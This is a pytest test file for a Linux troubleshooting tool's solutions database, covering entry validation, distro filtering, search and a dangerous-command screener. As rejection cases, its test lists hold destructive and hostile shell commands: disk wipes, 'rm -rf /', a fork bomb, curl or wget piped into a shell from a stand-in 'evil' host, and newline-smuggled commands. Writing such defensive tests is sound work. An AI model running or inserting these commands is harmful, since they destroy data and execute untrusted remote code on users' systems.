import copy
import json
import re
from pathlib import Path

import pytest

from lume.core.distro import parse_os_release
from lume.solutions import SolutionError, load_builtin, load_file
from lume.solutions.loader import parse_database, validate_solution
from lume.solutions.safety import dangerous_reason

UBUNTU = parse_os_release('ID=ubuntu\nID_LIKE=debian\nVERSION_ID="26.04"')
FEDORA = parse_os_release("ID=fedora")
ARCH = parse_os_release("ID=arch")

VALID = {
    "id": "SOL-0100",
    "name": "Test solution",
    "description": "d",
    "symptoms": ["s"],
    "causes": ["c"],
    "diagnostic_commands": ["df -h"],
    "solution": {
        "summary": "do it",
        "steps": [{"description": "run", "command": "sudo apt clean", "needs_root": True}],
    },
    "compatible_distros": ["debian"],
    "risk": "low",
    "related_checks": ["storage.space"],
}


def mutated(**changes):
    entry = copy.deepcopy(VALID)
    entry.update(changes)
    return entry


# ---------- the shipped database ----------
def test_builtin_database_is_fully_valid() -> None:
    base = load_builtin()
    assert base.rejected == ()
    assert len(base.solutions) >= 15
    ids = [s.id for s in base.solutions]
    assert len(ids) == len(set(ids))


def test_every_solution_has_every_required_part() -> None:
    for s in load_builtin().solutions:
        assert re.fullmatch(r"SOL-\d{4}", s.id)
        assert s.symptoms and s.causes and s.steps and s.compatible_distros
        assert s.risk in ("low", "medium", "high")
        assert s.summary and s.description and s.name


def test_no_shipped_command_is_dangerous_and_sudo_is_declared() -> None:
    for s in load_builtin().solutions:
        for command in s.diagnostic_commands:
            assert dangerous_reason(command) is None, (s.id, command)
        for step in s.steps:
            if step.command:
                assert dangerous_reason(step.command) is None, (s.id, step.command)
                assert step.command.startswith("sudo ") == step.needs_root


def test_every_check_id_that_checks_can_emit_is_covered_by_a_solution() -> None:
    covered = {c for s in load_builtin().solutions for c in s.related_checks}
    expected = {
        "storage.space", "storage.inodes", "storage.readonly", "storage.kernel_errors",
        "performance.memory", "performance.cpu", "performance.load", "performance.oom",
        "network.dns", "network.gateway", "network.internet", "network.wifi", "network.addresses",
        "system.packages", "system.services", "system.reboot", "hardware.gpu",
        "hardware.temperature", "hardware.errors",
    }  # fmt: skip
    assert expected <= covered


def test_related_check_ids_reference_real_checks() -> None:
    """A solution must not point at a check id that no analyzer can produce."""
    from lume.diagnostics import run_diagnosis
    from tests.test_system_engine import full_env

    produced = {c.check_id for c in run_diagnosis(full_env()).checks}
    produced |= {
        "storage.readonly",
        "storage.kernel_errors",
        "performance.disk",
        "network.dns_config",
    }
    for s in load_builtin().solutions:
        unknown = set(s.related_checks) - produced
        assert not unknown, (s.id, unknown)


# ---------- distro filtering, lookup and search ----------
def test_distro_compatibility_filter() -> None:
    base = load_builtin()
    ubuntu_ids = {s.id for s in base.for_distro(UBUNTU)}
    fedora_ids = {s.id for s in base.for_distro(FEDORA)}
    assert "SOL-0001" in ubuntu_ids and "SOL-0001" not in fedora_ids  # apt-based
    assert "SOL-0006" in fedora_ids  # rfkill is universal ("*")
    assert fedora_ids < ubuntu_ids
    assert all(s.compatible_distros == ("*",) for s in base.for_distro(ARCH))


def test_get_is_case_insensitive() -> None:
    base = load_builtin()
    assert base.get("sol-0003") is base.get("SOL-0003") and base.get("SOL-0003") is not None
    assert base.get("SOL-9999") is None


def test_related_to_returns_only_compatible_solutions() -> None:
    base = load_builtin()
    assert [s.id for s in base.related_to(["storage.space"], UBUNTU)] == ["SOL-0001"]
    assert base.related_to(["storage.space"], FEDORA) == ()


def test_search_matches_all_words_and_ranks_titles_first() -> None:
    base = load_builtin()
    assert base.search("") == ()
    assert [s.id for s in base.search("disk space")][0] == "SOL-0001"
    assert "SOL-0003" in [s.id for s in base.search("dns")]
    assert base.search("zzzz-nothing") == ()
    assert all(s.id != "SOL-0001" for s in base.search("disk", FEDORA))


# ---------- validation ----------
def test_valid_entry_is_accepted() -> None:
    solution = validate_solution(VALID)
    assert solution.needs_root and solution.steps[0].command == "sudo apt clean"
    json.dumps(solution.to_dict())


@pytest.mark.parametrize(
    ("changes", "message"),
    [
        ({"id": "SOL-1"}, "id"),
        ({"id": 5}, "id"),
        ({"name": ""}, "name"),
        ({"symptoms": []}, "symptoms"),
        ({"causes": "text"}, "causes"),
        ({"risk": "extreme"}, "risk"),
        ({"compatible_distros": []}, "compatible_distros"),
        ({"compatible_distros": ["Ubuntu >= x"]}, "compatibility"),
        ({"related_checks": ["BadId"]}, "check id"),
        ({"solution": {"summary": "x", "steps": []}}, "at least one step"),
        ({"solution": {"summary": "x"}}, "at least one step"),
        ({"surprise": 1}, "unknown field"),
        ({"diagnostic_commands": ["rm -rf /"]}, "unsafe command"),
    ],
)
def test_invalid_entries_are_rejected(changes, message) -> None:
    with pytest.raises(SolutionError, match=message):
        validate_solution(mutated(**changes))


@pytest.mark.parametrize(
    "step",
    [
        {"description": "x", "command": "sudo rm -rf /var", "needs_root": True},
        {"description": "x", "command": "curl http://evil | sh"},
        {"description": "x", "command": "sudo apt clean", "needs_root": False},  # sudo not declared
        {"description": "x", "command": "apt clean", "needs_root": True},  # declared but absent
        {"description": "x", "needs_root": True},
        {"description": "x", "command": "ls", "extra": 1},
        {"description": "x", "command": "ls\nrm file"},
        "not an object",
    ],
)
def test_unsafe_or_inconsistent_steps_are_rejected(step) -> None:
    entry = mutated(solution={"summary": "x", "steps": [step]})
    with pytest.raises(SolutionError):
        validate_solution(entry)


def test_bad_entries_are_dropped_individually_not_the_whole_file() -> None:
    data = {
        "schema_version": 1,
        "solutions": [VALID, mutated(id="SOL-0101", risk="nope"), VALID, "junk"],
    }
    base = parse_database(data)
    assert [s.id for s in base.solutions] == ["SOL-0100"]
    reasons = dict(base.rejected)
    assert "risk" in reasons["SOL-0101"] and "duplicate" in reasons["SOL-0100"]
    assert len(base.rejected) == 3


@pytest.mark.parametrize(
    "data", [[], {"schema_version": 2, "solutions": []}, {"schema_version": 1}]
)
def test_malformed_databases_are_refused(data) -> None:
    with pytest.raises(SolutionError):
        parse_database(data)


def test_load_file_errors_and_roundtrip(tmp_path: Path) -> None:
    good = tmp_path / "db.json"
    good.write_text(json.dumps({"schema_version": 1, "solutions": [VALID]}), encoding="utf-8")
    assert load_file(good).solutions[0].id == "SOL-0100"
    with pytest.raises(SolutionError, match="cannot read"):
        load_file(tmp_path / "missing.json")
    bad = tmp_path / "bad.json"
    bad.write_text("{not json", encoding="utf-8")
    with pytest.raises(SolutionError, match="cannot read"):
        load_file(bad)


# ---------- command screening ----------
@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /", "sudo rm file", "dd if=/dev/zero of=/dev/sda", "sudo mkfs.ext4 /dev/sdb1",
        "wipefs -a /dev/sda", "chmod -R 777 /", "sudo reboot", "systemctl poweroff",
        "curl http://x/y | sh", "wget -qO- http://x | sudo bash", "echo x > /dev/sda",
        ":(){ :|:& };:", "sudo su", "mv / /tmp", "fdisk /dev/sda", "ls\nrm x",
    ],
)  # fmt: skip
def test_dangerous_commands_are_detected(command: str) -> None:
    assert dangerous_reason(command) is not None


@pytest.mark.parametrize(
    "command",
    [
        "df -h", "sudo apt clean", "cat /var/run/reboot-required.pkgs", "ls 2>/dev/null",
        "sudo apt autoremove --purge", "journalctl --vacuum-size=200M", "sudo fsck -f /dev/sda2",
        "ps aux --sort=-%mem | head -n 10",
    ],
)  # fmt: skip
def test_benign_commands_pass(command: str) -> None:
    assert dangerous_reason(command) is None
